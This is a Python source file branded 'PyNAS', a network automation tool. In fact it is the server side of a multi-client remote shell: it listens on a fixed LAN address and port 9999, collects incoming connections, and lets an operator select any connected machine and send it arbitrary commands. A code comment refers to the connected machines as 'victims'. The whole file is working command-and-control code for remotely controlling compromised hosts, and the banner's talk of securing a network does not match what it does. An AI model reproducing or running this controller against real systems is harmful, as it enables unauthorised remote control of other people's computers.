import socket           # way of connecting two nodes on a network to communicate with each other.
import threading        # used to run multiple threads (tasks, function calls) at the same time.
import time             # time module provides many ways of representing time in code.
from queue import Queue     # module implements multi-producer, multi-consumer queues.

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket (allows two computers to connect)
def socket_creation():
    try:
        global host
        global port
        global s
        host = '192.168.0.113'		# Update IP if configured through DHCP.
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error :" + str(msg))

# Bind socket to port (the host and port the communication will take place) and wait for connection from client

def socket_binding():
    try:
        global host
        global port
        global s
        print("\nBinding The Port : " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error : " + str(msg) + "Retrying.....")
        time.sleep(5)
        socket_binding()


# Accept connections from multiple clients and save to list

def connection_accepting():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(True)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been eshtablish: " + address[0])
        except:
            print("Error Accepting connections")


# Interactive prompt for sending commands remotely

def start_pynas():
    while True:
        cmd = input('pynas> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command Not Recognized")


# Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '  ' + str(all_addresses[i][0]) +  '  ' + str(all_addresses[i][1]) + '\n'
    print('------Clients------' + '\n' + results)


# Selecting a target

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Not a valid selection")
        return None

# send commands to clients/victims or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")

        except:
            print("Error sending commands")
            break


# create worker threads

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue(handle connections , send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_creation()
            socket_binding()
            connection_accepting()
        if x == 2:
            start_pynas()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

print("WELCOME TO PyNETWORK AUTOMATION SCRIPTS (PyNAS)")
print("-----------------------------------------------\n\n")

print("   **********                     ***         ***       ***          *********         ")
print("   ************                   ****        ***      ******       ************       ")
print("   ***      ****                  *****       ***     ***  ***     ****       ***      ")
print("   ***      ****                  ******      ***    ***    ***    ***                 ")
print("   ***      ****                  *** ***     ***   ***      ***   ****                ")
print("   ***     ****                   ***  ***    ***  **************  ***********         ")
print("   **********  ***           ***  ***   ***   ***  **************    ***********       ")
print("   ********     ***         ***   ***    ***  ***  ***        ***            ****      ")
print("   ***           ***       ***    ***     *** ***  ***        ***             ***      ")
print("   ***            ***     ***     ***      ******  ***        ***  ***       ****      ")
print("   ***             ****  ***      ***       *****  ***        ***   ************       ")
print("   ***               ******       ***        ****  ***        ***    *********         ")
print("                       ***                                                             ")
print("                      ***                                                              ")
print("                     ***            ,--------------------------------------------,     ")
print("                    ***             | AUTHORS:-- HRISHIKESH RANE & SIDHESH PARAB |     ")
print("                   ***              *--------------------------------------------*     ")
print("\nHAVE A LOOK INTO YOUR NETWORK & SECURE IT.")
print("---------------------------------------------\n")
create_workers()
create_jobs()


